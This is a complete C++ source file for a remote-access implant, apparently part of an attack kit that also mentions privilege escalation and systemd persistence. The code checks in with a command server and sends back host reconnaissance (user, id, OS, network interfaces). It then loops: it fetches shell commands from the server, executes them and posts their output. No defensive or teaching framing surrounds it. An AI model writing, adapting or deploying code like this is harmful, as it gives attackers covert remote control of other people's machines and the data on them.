#include <iostream>
#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <thread>
#include <atomic>
#include <chrono>

/** Run a shell command, return stdout. */
static std::string runCommand(const std::string& cmd) {
    std::array<char, 256> buffer{};
    std::string result;
    std::string fullCmd = "/bin/sh -c \"" + cmd + "\"";
    FILE* pipe = popen(fullCmd.c_str(), "r");
    if (!pipe) {
        return "error: failed to open pipe";
    }
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    int rc = pclose(pipe);
    (void)rc;
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

/** Pull value from {"key":"value"} without external libs. */
static std::string jsonValue(const std::string& body, const std::string& key) {
    if (body.empty()) return "";
    std::string needle = "\"" + key + "\"";
    size_t i = body.find(needle);
    if (i == std::string::npos) return "";
    size_t colon = body.find(':', i);
    if (colon == std::string::npos) return "";
    size_t s = body.find('"', colon);
    if (s == std::string::npos) return "";
    ++s;
    size_t e = body.find('"', s);
    if (e == std::string::npos || e <= s) return "";
    return body.substr(s, e - s);
}

/** Escape string for JSON value. */
static std::string jsonEscape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"': out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default: out += c; break;
        }
    }
    return out;
}

static const std::string IP_ADDRESS = "http://127.0.0.1:5000";
static const int POLL_SECONDS = 5;

/** HTTP POST with JSON body. Requires curl installed. */
static std::string post(const std::string& path, const std::string& json) {
    std::string cmd = "curl -s -m 5 -X POST -H 'Content-Type: application/json' -d \"" + jsonEscape(json) + "\" '" + IP_ADDRESS + path + "'";
    std::string out = runCommand(cmd);
    return out.empty() ? "" : out;
}

/** HTTP GET, return response body. */
static std::string get(const std::string& path) {
    std::string cmd = "curl -s -m 5 '" + IP_ADDRESS + path + "'";
    std::string out = runCommand(cmd);
    return out.empty() ? "" : out;
}

std::atomic<bool> running{true};

void poll_loop() {
    int fails = 0;

    while (running && fails < 50) {
        std::this_thread::sleep_for(std::chrono::seconds(POLL_SECONDS));

        try {
            std::string resp = get("/command");

            if (resp.empty()) { fails++; continue; }
            fails = 0;

            std::string cmd = jsonValue(resp, "command");

            if (cmd.empty() || cmd == "wait" || cmd == "none") continue;
            if (cmd == "exit" || cmd == "quit") {
                running = false;
                break;
            }

            std::string out = runCommand(cmd);
            post("/result", "{\"output\":\"" + jsonEscape(out) + "\"}");

        } catch (...) {
            fails++;
        }
    }
}

int main() {
    std::string host = runCommand("hostname");
    post("/checkin", std::string("{\"host\":\"") + jsonEscape(host) + "\"}");

    std::string recon = runCommand(
        "echo '=== HOSTNAME ===' && hostname && "
        "echo '=== WHOAMI ===' && whoami && "
        "echo '=== ID ===' && id && "
        "echo '=== OS ===' && uname -a && "
        "echo '=== NETWORK ===' && (ip addr 2>/dev/null || ifconfig 2>/dev/null)"
    );
    post("/result", std::string("{\"output\":\"") + jsonEscape(recon) + "\"}");

    std::thread t(poll_loop);
    t.join();

    return 0;
}

/*
Systemd setup:
1. Compile:
   g++ -std=c++17 Persistent.cpp -o Persistent.elf

2. See Beachhead.java for automatic deployment and privilege escalation that
   creates the systemd service for you.
*/
